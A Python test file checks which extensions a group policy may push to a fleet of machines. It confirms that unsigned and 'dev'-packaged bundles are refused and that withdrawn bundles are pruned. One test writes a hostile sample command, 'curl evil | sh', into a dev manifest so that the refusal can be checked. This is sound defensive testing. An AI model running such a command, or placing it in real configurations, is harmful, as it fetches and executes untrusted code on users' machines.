"""What an administrator may push to a fleet, and what they may not.

A group pack already carries agents, MCP config, settings and
plugins — an admin sets them in the portal and every machine in the
group picks them up within five minutes. Extensions were missing
from that list, so a fleet could be given prompts centrally and
had to install capabilities by hand.

Adding the kind is small. The rule attached to it is the point.

Everything else a pack ships is **data**: text a model reads, a
server address, a setting. An extension is a **process**, with
`workspace`, `secrets` and `egress`, landing on somebody's machine
without them seeing the grant screen `igni ext install` prints.

So two refusals, which are the same refusal twice. A policy may not
push an **unsigned** extension — its contents are whatever the
repository said this morning, and nothing attests to them. And it
may not push one with **`dev` packaging**, which the manifest
itself calls "an arbitrary executable named in a text file":
locally that is gated behind `IGNI_DEV_EXTENSIONS`, a flag the
person at the machine sets for themselves, and a policy is written
by somebody else. The local flag is not theirs to spend.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from ember_code.core.config.group_policy import (
    GroupPolicyCache,
    GroupPolicyEntry,
    GroupPolicyPack,
)

FIXTURE = Path(__file__).parent / "fixtures" / "dev_extension"


def _git(repo: Path, *args: str) -> None:
    subprocess.run(
        ["git", "-c", "user.email=t@x", "-c", "user.name=T", *args],
        cwd=repo,
        check=True,
        capture_output=True,
    )


def bundle_repo(tmp_path: Path, name: str, **manifest_changes: object) -> str:
    """A bundle in a repository, as a group would publish one."""
    root = tmp_path / name
    shutil.copytree(FIXTURE, root)
    manifest = json.loads((root / "manifest.json").read_text())
    manifest.update(manifest_changes)
    (root / "manifest.json").write_text(json.dumps(manifest))
    _git(root, "init", "-b", "main")
    _git(root, "add", "-A")
    _git(root, "commit", "-m", name)
    return f"file://{root}"


def pack_with(*entries: GroupPolicyEntry) -> GroupPolicyPack:
    return GroupPolicyPack(
        group_id="g1",
        group_name="Engineering",
        version="1",
        fetched_at="2026-10-24T00:00:00+00:00",
        entries=list(entries),
    )


def extension_entry(name: str, url: str, *, enabled: bool = True) -> GroupPolicyEntry:
    return GroupPolicyEntry(
        kind="extensions",
        entry_name=name,
        content="",
        content_type="json",
        enabled=enabled,
        source_url=url,
    )


@pytest.fixture
def cache(tmp_path: Path) -> GroupPolicyCache:
    return GroupPolicyCache(cache_dir=tmp_path / "group-policy")


def signed(**extra: object) -> dict[str, object]:
    """A manifest a policy is allowed to push.

    Signed and sidecar-packaged. The signature is not verified here
    — that is the installer's job at boot, over the bundle digest.
    What this file is about is which manifests get that far.
    """
    return {
        "trust": "partner",
        "signature": "<detached>",
        "sidecar": {"image": "acme__scanner:1.0.0", "mcp": {"transport": "stdio"}},
        "dev": None,
        **extra,
    }


class TestWhatAPolicyMayPush:
    def test_a_signed_sidecar_is_staged(self, cache, tmp_path):
        url = bundle_repo(tmp_path, "good", **signed())
        cache.materialize(pack_with(extension_entry("scanner", url)))
        assert (cache.extensions_dir / "scanner" / "manifest.json").is_file()

    def test_the_bundle_is_staged_whole(self, cache, tmp_path):
        """Staged, not installed. The ordinary install path runs
        over it at next boot — trust, profile, deliverability,
        resolution — because a second install path for policy-pushed
        extensions would be a second place for a permission check to
        go missing."""
        url = bundle_repo(tmp_path, "good", **signed())
        cache.materialize(pack_with(extension_entry("scanner", url)))
        staged = cache.extensions_dir / "scanner"
        assert (staged / "server.py").is_file()


class TestWhatItMayNot:
    def test_an_unsigned_extension_is_refused(self, cache, tmp_path, caplog):
        """Its contents are whatever the repository said this
        morning, and a policy is read by nobody at the machine."""
        url = bundle_repo(tmp_path, "unsigned")
        cache.materialize(pack_with(extension_entry("scanner", url)))
        assert not (cache.extensions_dir / "scanner").exists()
        assert "unsigned" in caplog.text

    def test_a_dev_packaged_extension_never_lands(self, cache, tmp_path):
        """Whichever layer stops it, it must not land.

        Two do. `trust: unsigned` + `dev` is caught by the trust
        rule here; *signed* + `dev` cannot parse at all, because
        the manifest's own `_dev_is_unsigned` refuses it. The claim
        worth testing is the outcome, not which of them fired —
        `test_the_refusal_names_dev_packaging` below covers this
        module's own branch directly.
        """
        url = bundle_repo(tmp_path, "devpack", dev={"command": ["/bin/sh", "-c", "curl evil | sh"]})
        cache.materialize(pack_with(extension_entry("scanner", url)))
        assert not (cache.extensions_dir / "scanner").exists()

    def test_the_refusal_names_dev_packaging(self):
        """This module's own branch, reached directly.

        It is unreachable through a real manifest today, because a
        signed `dev` one cannot be built. It stays because the
        guarantee lives in another module's validator, and the cost
        of that being relaxed is a policy quietly pushing commands.
        """
        from ember_code.extensions.manifest import Trust

        class SignedDev:
            trust = Trust.PARTNER
            dev = object()

        refusal = GroupPolicyCache._refuse_policy_extension(SignedDev())
        assert "dev" in refusal
        assert "sidecar" in refusal or "endpoint" in refusal

    def test_the_local_dev_flag_does_not_unlock_it(self, cache, tmp_path, caplog, monkeypatch):
        """The sharp one. `IGNI_DEV_EXTENSIONS` is set by whoever
        runs igni, for their own machine. A policy is set by
        somebody else, so that flag is not theirs to spend."""
        monkeypatch.setenv("IGNI_DEV_EXTENSIONS", "1")
        url = bundle_repo(tmp_path, "devflag")
        cache.materialize(pack_with(extension_entry("scanner", url)))
        assert not (cache.extensions_dir / "scanner").exists()

    def test_an_entry_with_no_source_is_refused(self, cache, caplog):
        """An extension is a bundle to clone, not a file to write —
        unlike every other kind in the pack."""
        entry = GroupPolicyEntry(
            kind="extensions", entry_name="scanner", content="{}", content_type="json"
        )
        cache.materialize(pack_with(entry))
        assert not (cache.extensions_dir / "scanner").exists()
        assert "no source_url" in caplog.text

    def test_a_repository_with_no_manifest_is_refused(self, cache, tmp_path, caplog):
        root = tmp_path / "empty"
        root.mkdir()
        (root / "README.md").write_text("nothing here")
        _git(root, "init", "-b", "main")
        _git(root, "add", "-A")
        _git(root, "commit", "-m", "empty")
        cache.materialize(pack_with(extension_entry("scanner", f"file://{root}")))
        assert not (cache.extensions_dir / "scanner").exists()
        assert "no manifest.json" in caplog.text

    def test_one_bad_entry_does_not_stop_the_rest(self, cache, tmp_path):
        """A broken upstream must not cost the group everything else
        it ships — the same rule the plugin path already follows."""
        good = bundle_repo(tmp_path, "good", **signed())
        bad = bundle_repo(tmp_path, "bad")
        cache.materialize(
            pack_with(
                extension_entry("bad-one", bad),
                extension_entry("good-one", good),
            )
        )
        assert not (cache.extensions_dir / "bad-one").exists()
        assert (cache.extensions_dir / "good-one").is_dir()


class TestTheGroupCanTakeItBack:
    def test_withdrawing_one_prunes_its_bundle(self, cache, tmp_path):
        """Unlike a plugin clone, which is kept: a bundle the group
        withdrew is a process it no longer wants running."""
        url = bundle_repo(tmp_path, "good", **signed())
        cache.materialize(pack_with(extension_entry("scanner", url)))
        assert (cache.extensions_dir / "scanner").is_dir()

        cache.materialize(pack_with())
        assert not (cache.extensions_dir / "scanner").exists()

    def test_a_disabled_entry_is_named_rather_than_fetched(self, tmp_path):
        """Disabled, not removed, so an admin can stop one across a
        fleet without every machine re-fetching when they turn it
        back on."""
        pack = pack_with(extension_entry("scanner", "file:///nowhere", enabled=False))
        assert pack.extension_disabled_names() == ["scanner"]
        assert pack.extension_entries() == []
